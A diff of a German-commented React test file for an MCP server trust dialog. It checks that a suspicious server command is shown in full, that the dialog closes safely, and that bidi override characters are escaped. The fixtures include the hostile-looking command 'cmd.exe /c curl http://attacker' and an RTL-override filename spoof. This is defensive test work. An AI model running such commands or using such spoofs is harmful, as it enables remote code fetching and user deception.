@@ -48,7 +48,11 @@ describe('McpTrustModal', () => {
     expect(details.textContent).toContain('evil-mcp');
     expect(details.textContent).toContain('claude-code-project');
     expect(details.textContent).toContain('cmd.exe');
-    expect(details.textContent).toContain('/c curl http://attacker');
+    // Per-token args render (M3 hardening 2026-05-24) — args werden mit
+    // ' · '-Trenn-Zeichen statt Plain-Space gerendert
+    expect(details.textContent).toContain('/c');
+    expect(details.textContent).toContain('curl');
+    expect(details.textContent).toContain('http://attacker');
   });
 
   it('zeigt "(keine)" wenn args leer ist', async () => {
@@ -157,6 +161,94 @@ describe('McpTrustModal', () => {
     expect(await screen.findByText(/sidecar not available/)).toBeInTheDocument();
     // Modal bleibt offen damit User die Fehlermeldung sieht
     expect(onClose).not.toHaveBeenCalled();
+  });
+
+  // -------- M3 hardening (Codex review 2026-05-24) --------
+
+  it('Esc-key schliesst Modal OHNE acknowledge zu rufen', async () => {
+    const onClose = vi.fn();
+    const onAcknowledged = vi.fn();
+    const { McpTrustModal } = await import('../src/components/mcp-trust-modal');
+    render(
+      <McpTrustModal
+        serverKey="x:y"
+        entry={ENTRY}
+        message=""
+        onClose={onClose}
+        onAcknowledged={onAcknowledged}
+      />,
+    );
+    const panel = screen.getByRole('dialog');
+    fireEvent.keyDown(panel, { key: 'Escape' });
+    expect(onClose).toHaveBeenCalledTimes(1);
+    expect(onAcknowledged).not.toHaveBeenCalled();
+    expect(invokeMock).not.toHaveBeenCalled();
+  });
+
+  it('Backdrop-Click schliesst Modal OHNE acknowledge zu rufen', async () => {
+    const onClose = vi.fn();
+    const onAcknowledged = vi.fn();
+    const { McpTrustModal } = await import('../src/components/mcp-trust-modal');
+    const { container } = render(
+      <McpTrustModal
+        serverKey="x:y"
+        entry={ENTRY}
+        message=""
+        onClose={onClose}
+        onAcknowledged={onAcknowledged}
+      />,
+    );
+    const backdrop = container.querySelector('.modal-backdrop');
+    if (!backdrop) throw new Error('backdrop not found');
+    fireEvent.click(backdrop);
+    expect(onClose).toHaveBeenCalledTimes(1);
+    expect(onAcknowledged).not.toHaveBeenCalled();
+    expect(invokeMock).not.toHaveBeenCalled();
+  });
+
+  it('sanitizeForDisplay escapes bidi/control chars im command-Anzeige', async () => {
+    const { McpTrustModal } = await import('../src/components/mcp-trust-modal');
+    render(
+      <McpTrustModal
+        serverKey="x:y"
+        entry={{
+          ...ENTRY,
+          // 'cmd.exe' + RIGHT-TO-LEFT OVERRIDE (U+202E) + 'evil.exe' —
+          // ohne sanitizer wuerden viele renderer das als "exe.live cmd.exe"
+          // darstellen und der User saehe NICHT den realen Befehl.
+          command: 'cmd.exe‮evil.exe',
+        }}
+        message=""
+        onClose={() => {}}
+        onAcknowledged={() => {}}
+      />,
+    );
+    const details = screen.getByTestId('mcp-trust-details');
+    // Der RTL-OVERRIDE-char wurde als visible escape ersetzt
+    expect(details.textContent).toContain('[U+202E]');
+    // Der raw U+202E darf NICHT mehr im DOM-text sein
+    expect(details.textContent).not.toContain('‮');
+  });
+
+  it('per-token args render statt join(" "): args mit Spaces bleiben als 2 Tokens erkennbar', async () => {
+    const { McpTrustModal } = await import('../src/components/mcp-trust-modal');
+    render(
+      <McpTrustModal
+        serverKey="x:y"
+        entry={{
+          ...ENTRY,
+          args: ['--flag', '--option with spaces'],
+        }}
+        message=""
+        onClose={() => {}}
+        onAcknowledged={() => {}}
+      />,
+    );
+    const argsBlock = screen.getByTestId('mcp-trust-args');
+    // Per-token-Trenn-Zeichen sollte zwischen den Args sichtbar sein
+    expect(argsBlock.textContent).toContain('·');
+    expect(argsBlock.textContent).toContain('--flag');
+    expect(argsBlock.textContent).toContain('--option with spaces');
   });
 
   it('reprobe-Fehler bricht den Acknowledge-Erfolg NICHT (best-effort)', async () => {
